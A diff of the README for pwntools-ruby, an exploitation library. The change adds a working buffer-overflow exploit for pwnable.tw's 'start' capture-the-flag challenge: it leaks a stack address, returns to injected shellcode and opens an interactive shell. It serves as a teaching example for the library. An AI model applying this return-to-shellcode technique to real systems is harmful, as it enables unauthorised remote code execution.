@@ -14,6 +14,7 @@ So this is an attempt to create such library.
 
 Would try to have consistent naming with original pwntools, and do things in Ruby style.
 
+Here's an exploitation for `start` which is a challenge on `pwnable.tw`.
 # Example Usage
 ```ruby
 # encoding: ASCII-8BIT
@@ -22,23 +23,25 @@ Would try to have consistent naming with original pwntools, and do things in Rub
 
 require 'pwn'
 
-p pack(0x41424344)  # 'DCBA'
-context.endian = 'big'
-p pack(0x41424344)  # 'ABCD'
-
-context.local(bits: 16) do
-  p pack(0x4142)  # 'AB'
-end
-
 context.log_level = :debug
-s = Sock.new('exploitme.example.com', 31337)
-# EXPLOIT CODE GOES HERE
-s.send(0xdeadbeef.p32)
-s.send(asm(shellcraft.sh))
-s.interact
+z = Sock.new 'chall.pwnable.tw', 10000
+
+z.recvuntil "Let's start the CTF:"
+z.send p32(0x8048087).rjust(0x18, 'A')
+stk = u32(z.recvuntil "\xff")
+log.info "stack address: #{stk.hex}" # Log stack address
+
+# Return to shellcode
+addr = stk + 0x14
+payload = addr.p32.rjust(0x18, 'A') + asm(shellcraft.sh)
+z.write payload
+
+# Switch to interactive mode
+z.interact
 ```
 
-More features and details can be found in TBA.
+More features and details can be found in the
+![documentation](http://www.rubydoc.info/github/peter50216/pwntools-ruby/master/frames).
 
 # Installation
 
